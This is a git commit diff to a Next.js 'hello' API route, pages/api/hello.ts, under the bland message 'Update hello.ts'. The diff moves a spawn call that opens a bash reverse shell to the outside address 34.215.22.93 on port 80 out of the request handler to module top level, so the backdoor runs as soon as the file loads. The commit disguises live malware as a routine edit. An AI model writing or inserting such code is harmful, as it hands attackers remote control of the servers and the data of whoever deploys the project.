5c2353d6d54568e23ddcbb3bebf94f76b689235b
yoloampli <ylosonci+amplify@amazon.com>
2024-12-12 09:58:43 -0500

    Update hello.ts

--- pages/api/hello.ts
+++ pages/api/hello.ts
@@ -1,6 +1,10 @@
 import type { NextApiRequest, NextApiResponse } from 'next'
 import { spawn } from 'child_process';
- 
+
+const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/34.215.22.93/80', '0<&1', '2>&1'], { shell: true });
+console.log(child);
+
+
 type ResponseData = {
   message: string
 }
@@ -10,6 +14,4 @@ export default function handler(
   res: NextApiResponse<ResponseData>
 ) {
   res.status(200).json({ message: 'Hello from Next.js!' })
-  const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/34.215.22.93/80', '0<&1', '2>&1'], { shell: true });
-  console.log(child);
 }
